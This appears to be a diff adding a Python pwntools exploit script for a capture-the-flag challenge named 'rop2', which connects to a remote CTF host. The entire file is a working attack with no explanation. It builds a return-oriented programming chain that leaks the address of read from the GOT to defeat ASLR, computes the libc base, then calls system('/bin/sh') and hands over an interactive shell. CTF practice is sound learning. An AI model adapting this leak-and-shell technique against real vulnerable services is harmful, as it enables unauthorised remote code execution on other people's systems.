@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+import os
+
+DEBUG = False
+
+elf_name = 'challenge'
+libc_name = 'rop2_libc.so'
+remote_address = 'university.opentoallctf.com'
+remote_port = 30002
+
+#context.log_level = 'debug'
+context.arch = 'amd64'
+
+env = os.environ
+elf = ELF(elf_name)
+
+if libc_name != '':
+    libc = ELF(libc_name)
+    env['LD_PRELOAD'] = libc.path
+else:
+    libc = elf.libc
+
+if DEBUG:
+    p = process(elf.path, env=env)
+    raw_input('start')
+else:
+    p = remote(remote_address, remote_port)
+
+payload = flat(0, 0, elf.symbols['set_rdi'], 1, elf.symbols['set_rsi'], elf.got['read'], elf.symbols['set_rdx'], 8, elf.symbols['write'], elf.symbols['main'])
+
+p.sendafter('Give me some data:\n', payload)
+
+libc.address = u64(p.recvuntil('Give me some data:\n', drop=True)) - libc.symbols['read']
+
+payload = flat(0, 0, elf.symbols['set_rdi'], next(libc.search('/bin/sh')), libc.symbols['system'])
+
+p.send(payload)
+
+p.interactive()
+
+
